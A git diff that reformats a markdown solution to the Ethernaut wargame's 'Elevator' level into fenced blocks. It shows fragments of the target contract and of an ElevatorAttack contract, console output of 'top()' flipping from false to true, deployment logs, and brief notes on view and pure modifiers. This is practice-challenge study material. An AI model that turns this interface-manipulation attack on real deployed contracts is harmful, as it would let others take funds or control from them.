@@ -1,5 +1,7 @@
-11. Elevator
+## Ethernaut-solution
 
+### 11. Elevator
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -31,8 +33,9 @@ contract Elevator {
     }
   }
 }
+```
 
-
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -57,11 +60,12 @@ contract ElevatorAttack {
          target.goTo(_floor);
      }
 }
-
-
+```
+```
 >await contract.top()
 false
-
+```
+```
 >await contract.floor()
 o {negative: 0, words: Array(2), length: 1, red: null}
 length: 1
@@ -72,27 +76,31 @@ words: Array(2)
 length: 2
 [[Prototype]]: Array(0)
 [[Prototype]]: Object
+```
 
 //a visibility modifier or what is sometimes called a visibillity specifier 
-//basically denotes who gets to invoke certain function 
 
+//basically denotes who gets to invoke certain function 
+```
 >contract.address
 
 '0x8fFa9c56792650D32E2fA82bca71D664AA26Bee0'
-
+```
 
 //deploy 
-
+```
 [block:10904894 txIndex:3]from: 0xF6e...f30F5to: ElevatorAttack.(constructor)value: 0 weidata: 0x608...57f5blogs: 0hash: 0x6e9...d61dc
+```
 
 //DeployedContract setTopに15階をsetting 
-
+```
 [block:10904912 txIndex:9]from: 0xF6e...f30F5to: ElevatorAttack.setTop(uint256) 0x1F1...5387cvalue: 0 weidata: 0x3f2...0000flogs: 0hash: 0x461...27f04
-
-
+```
+```
 >await contract.top()
 true
-
+```
+```
 >await contract.floor()
 o {negative: 0, words: Array(2), length: 1, red: null}
 length: 1
@@ -103,7 +111,7 @@ words: Array(2)
 length: 2
 [[Prototype]]: Array(0)
 [[Prototype]]: Object
-
+```
 
 You can use the view function modifier on an interface in order to prevent state modifications.
  The pure modifier also prevents functions from modifying the state. 
